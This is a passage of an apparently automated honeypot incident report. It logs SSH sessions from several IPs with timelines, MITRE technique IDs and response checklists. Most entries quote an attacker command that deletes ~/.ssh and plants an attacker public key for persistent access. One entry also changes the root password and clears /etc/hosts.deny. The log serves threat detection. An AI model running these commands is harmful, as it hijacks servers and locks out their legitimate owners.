| **Last Seen** | 2026-04-16 14:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:23:00` | `cowrie.session.connect` |
| `2026-04-16 14:23:00` | `cowrie.client.version` |
| `2026-04-16 14:23:00` | `cowrie.client.kex` |
| `2026-04-16 14:23:01` | `cowrie.login.success` |
| `2026-04-16 14:23:01` | `cowrie.session.params` |
| `2026-04-16 14:23:01` | `cowrie.command.input` |
| `2026-04-16 14:23:01` | `cowrie.command.failed` |
| `2026-04-16 14:23:01` | `cowrie.log.closed` |
| `2026-04-16 14:23:02` | `cowrie.session.params` |
| `2026-04-16 14:23:02` | `cowrie.command.input` |
| `2026-04-16 14:23:02` | `cowrie.session.file_download` |
| `2026-04-16 14:23:02` | `cowrie.log.closed` |
| `2026-04-16 14:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b555d417d28

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:23 |
| **Last Seen** | 2026-04-16 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:23:04` | `cowrie.session.connect` |
| `2026-04-16 14:23:04` | `cowrie.client.version` |
| `2026-04-16 14:23:04` | `cowrie.client.kex` |
| `2026-04-16 14:23:05` | `cowrie.login.success` |
| `2026-04-16 14:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d82409618e5

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:24 |
| **Last Seen** | 2026-04-16 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:24:48` | `cowrie.session.connect` |
| `2026-04-16 14:24:48` | `cowrie.client.version` |
| `2026-04-16 14:24:48` | `cowrie.client.kex` |
| `2026-04-16 14:24:48` | `cowrie.login.success` |
| `2026-04-16 14:24:49` | `cowrie.session.params` |
| `2026-04-16 14:24:49` | `cowrie.command.input` |
| `2026-04-16 14:24:49` | `cowrie.command.failed` |
| `2026-04-16 14:24:49` | `cowrie.log.closed` |
| `2026-04-16 14:24:49` | `cowrie.session.params` |
| `2026-04-16 14:24:49` | `cowrie.command.input` |
| `2026-04-16 14:24:49` | `cowrie.session.file_download` |
| `2026-04-16 14:24:49` | `cowrie.log.closed` |
| `2026-04-16 14:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1628c62e6d2f

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:24 |
| **Last Seen** | 2026-04-16 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:24:51` | `cowrie.session.connect` |
| `2026-04-16 14:24:51` | `cowrie.client.version` |
| `2026-04-16 14:24:52` | `cowrie.client.kex` |
| `2026-04-16 14:24:52` | `cowrie.login.success` |
| `2026-04-16 14:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c164b37726

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:28 |
| **Last Seen** | 2026-04-16 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:28:37` | `cowrie.session.connect` |
| `2026-04-16 14:28:37` | `cowrie.client.version` |
| `2026-04-16 14:28:37` | `cowrie.client.kex` |
| `2026-04-16 14:28:38` | `cowrie.login.success` |
| `2026-04-16 14:28:38` | `cowrie.session.params` |
| `2026-04-16 14:28:38` | `cowrie.command.input` |
| `2026-04-16 14:28:38` | `cowrie.command.failed` |
| `2026-04-16 14:28:38` | `cowrie.log.closed` |
| `2026-04-16 14:28:38` | `cowrie.session.params` |
| `2026-04-16 14:28:38` | `cowrie.command.input` |
| `2026-04-16 14:28:39` | `cowrie.session.file_download` |
| `2026-04-16 14:28:39` | `cowrie.log.closed` |
| `2026-04-16 14:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f43f71e4919

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:28 |
| **Last Seen** | 2026-04-16 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:28:41` | `cowrie.session.connect` |
| `2026-04-16 14:28:41` | `cowrie.client.version` |
| `2026-04-16 14:28:41` | `cowrie.client.kex` |
| `2026-04-16 14:28:41` | `cowrie.login.success` |
| `2026-04-16 14:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3971ec39bf7c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-04-16 14:39 |
| **Last Seen** | 2026-04-16 14:40 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OkOmoZxroE5i"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:39:34` | `cowrie.session.connect` |
| `2026-04-16 14:39:34` | `cowrie.client.version` |
| `2026-04-16 14:39:35` | `cowrie.client.kex` |
| `2026-04-16 14:39:37` | `cowrie.login.success` |
| `2026-04-16 14:39:38` | `cowrie.session.params` |
| `2026-04-16 14:39:38` | `cowrie.command.input` |
| `2026-04-16 14:39:38` | `cowrie.command.failed` |
| `2026-04-16 14:39:38` | `cowrie.log.closed` |
| `2026-04-16 14:39:39` | `cowrie.session.params` |
| `2026-04-16 14:39:39` | `cowrie.command.input` |
| `2026-04-16 14:39:40` | `cowrie.session.file_download` |
| `2026-04-16 14:39:40` | `cowrie.log.closed` |
| `2026-04-16 14:39:52` | `cowrie.session.params` |
| `2026-04-16 14:39:52` | `cowrie.command.input` |
| `2026-04-16 14:39:52` | `cowrie.log.closed` |
| `2026-04-16 14:39:53` | `cowrie.session.params` |
| `2026-04-16 14:39:53` | `cowrie.command.input` |
| `2026-04-16 14:39:53` | `cowrie.log.closed` |
| `2026-04-16 14:39:54` | `cowrie.session.params` |
| `2026-04-16 14:39:54` | `cowrie.command.input` |
| `2026-04-16 14:39:54` | `cowrie.session.file_download` |
| `2026-04-16 14:39:54` | `cowrie.log.closed` |
| `2026-04-16 14:39:54` | `cowrie.session.params` |
| `2026-04-16 14:39:54` | `cowrie.command.input` |
| `2026-04-16 14:39:55` | `cowrie.log.closed` |
| `2026-04-16 14:39:56` | `cowrie.session.params` |
| `2026-04-16 14:39:56` | `cowrie.command.input` |
| `2026-04-16 14:39:56` | `cowrie.log.closed` |
| `2026-04-16 14:39:57` | `cowrie.session.params` |
| `2026-04-16 14:39:57` | `cowrie.command.input` |
| `2026-04-16 14:39:57` | `cowrie.command.input` |
| `2026-04-16 14:39:57` | `cowrie.log.closed` |
| `2026-04-16 14:39:58` | `cowrie.session.params` |
| `2026-04-16 14:39:58` | `cowrie.command.input` |
| `2026-04-16 14:39:58` | `cowrie.log.closed` |
| `2026-04-16 14:39:59` | `cowrie.session.params` |
| `2026-04-16 14:39:59` | `cowrie.command.input` |
| `2026-04-16 14:39:59` | `cowrie.log.closed` |
| `2026-04-16 14:40:00` | `cowrie.session.params` |
| `2026-04-16 14:40:00` | `cowrie.command.input` |
| `2026-04-16 14:40:01` | `cowrie.log.closed` |
| `2026-04-16 14:40:02` | `cowrie.session.params` |
| `2026-04-16 14:40:02` | `cowrie.command.input` |
| `2026-04-16 14:40:03` | `cowrie.log.closed` |
| `2026-04-16 14:40:03` | `cowrie.session.params` |
| `2026-04-16 14:40:03` | `cowrie.command.input` |
| `2026-04-16 14:40:03` | `cowrie.log.closed` |
| `2026-04-16 14:40:04` | `cowrie.session.params` |
| `2026-04-16 14:40:04` | `cowrie.command.input` |
| `2026-04-16 14:40:04` | `cowrie.log.closed` |
| `2026-04-16 14:40:05` | `cowrie.session.params` |
| `2026-04-16 14:40:05` | `cowrie.command.input` |
| `2026-04-16 14:40:06` | `cowrie.log.closed` |
| `2026-04-16 14:40:06` | `cowrie.session.params` |
| `2026-04-16 14:40:06` | `cowrie.command.input` |
| `2026-04-16 14:40:07` | `cowrie.log.closed` |
| `2026-04-16 14:40:08` | `cowrie.session.params` |
| `2026-04-16 14:40:08` | `cowrie.command.input` |
| `2026-04-16 14:40:08` | `cowrie.log.closed` |
| `2026-04-16 14:40:09` | `cowrie.session.params` |
| `2026-04-16 14:40:09` | `cowrie.command.input` |
| `2026-04-16 14:40:09` | `cowrie.log.closed` |
| `2026-04-16 14:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31afe124216a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:40 |
| **Last Seen** | 2026-04-16 14:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:40:15` | `cowrie.session.connect` |
| `2026-04-16 14:40:15` | `cowrie.client.version` |
| `2026-04-16 14:40:15` | `cowrie.client.kex` |
| `2026-04-16 14:40:16` | `cowrie.login.success` |
| `2026-04-16 14:40:17` | `cowrie.session.params` |
| `2026-04-16 14:40:17` | `cowrie.command.input` |
| `2026-04-16 14:40:17` | `cowrie.command.failed` |
| `2026-04-16 14:40:17` | `cowrie.log.closed` |
| `2026-04-16 14:40:18` | `cowrie.session.params` |
| `2026-04-16 14:40:18` | `cowrie.command.input` |
| `2026-04-16 14:40:18` | `cowrie.session.file_download` |
| `2026-04-16 14:40:18` | `cowrie.log.closed` |
| `2026-04-16 14:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2eafb391447

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:40 |
| **Last Seen** | 2026-04-16 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:40:22` | `cowrie.session.connect` |
| `2026-04-16 14:40:22` | `cowrie.client.version` |
| `2026-04-16 14:40:22` | `cowrie.client.kex` |
| `2026-04-16 14:40:23` | `cowrie.login.success` |
| `2026-04-16 14:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8284195eee85

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:42 |
| **Last Seen** | 2026-04-16 14:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:42:06` | `cowrie.session.connect` |
| `2026-04-16 14:42:06` | `cowrie.client.version` |
| `2026-04-16 14:42:07` | `cowrie.client.kex` |
| `2026-04-16 14:42:08` | `cowrie.login.success` |
| `2026-04-16 14:42:09` | `cowrie.session.params` |
| `2026-04-16 14:42:09` | `cowrie.command.input` |
| `2026-04-16 14:42:09` | `cowrie.command.failed` |
| `2026-04-16 14:42:09` | `cowrie.log.closed` |
| `2026-04-16 14:42:10` | `cowrie.session.params` |
| `2026-04-16 14:42:10` | `cowrie.command.input` |
| `2026-04-16 14:42:10` | `cowrie.session.file_download` |
| `2026-04-16 14:42:10` | `cowrie.log.closed` |
| `2026-04-16 14:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4caecb9c58e1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:42 |
| **Last Seen** | 2026-04-16 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:42:13` | `cowrie.session.connect` |
| `2026-04-16 14:42:13` | `cowrie.client.version` |
| `2026-04-16 14:42:14` | `cowrie.client.kex` |
| `2026-04-16 14:42:15` | `cowrie.login.success` |
| `2026-04-16 14:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efafa5c9a4a3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:44 |
| **Last Seen** | 2026-04-16 14:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:44:02` | `cowrie.session.connect` |
| `2026-04-16 14:44:02` | `cowrie.client.version` |
| `2026-04-16 14:44:02` | `cowrie.client.kex` |
| `2026-04-16 14:44:04` | `cowrie.login.success` |
| `2026-04-16 14:44:04` | `cowrie.session.params` |
| `2026-04-16 14:44:04` | `cowrie.command.input` |
| `2026-04-16 14:44:04` | `cowrie.command.failed` |
| `2026-04-16 14:44:05` | `cowrie.log.closed` |
| `2026-04-16 14:44:05` | `cowrie.session.params` |
| `2026-04-16 14:44:05` | `cowrie.command.input` |
| `2026-04-16 14:44:06` | `cowrie.session.file_download` |
| `2026-04-16 14:44:06` | `cowrie.log.closed` |
| `2026-04-16 14:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f77c07417ec

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:44 |
| **Last Seen** | 2026-04-16 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:44:09` | `cowrie.session.connect` |
| `2026-04-16 14:44:09` | `cowrie.client.version` |
| `2026-04-16 14:44:09` | `cowrie.client.kex` |
| `2026-04-16 14:44:10` | `cowrie.login.success` |
| `2026-04-16 14:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb5f5c774e5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:47 |
| **Last Seen** | 2026-04-16 14:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:47:49` | `cowrie.session.connect` |
| `2026-04-16 14:47:49` | `cowrie.client.version` |
| `2026-04-16 14:47:50` | `cowrie.client.kex` |
| `2026-04-16 14:47:51` | `cowrie.login.success` |
| `2026-04-16 14:47:51` | `cowrie.session.params` |
| `2026-04-16 14:47:51` | `cowrie.command.input` |
| `2026-04-16 14:47:51` | `cowrie.command.failed` |
| `2026-04-16 14:47:52` | `cowrie.log.closed` |
| `2026-04-16 14:47:52` | `cowrie.session.params` |
| `2026-04-16 14:47:52` | `cowrie.command.input` |
| `2026-04-16 14:47:53` | `cowrie.session.file_download` |
| `2026-04-16 14:47:53` | `cowrie.log.closed` |
| `2026-04-16 14:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d76b76c0a1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:47 |
| **Last Seen** | 2026-04-16 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
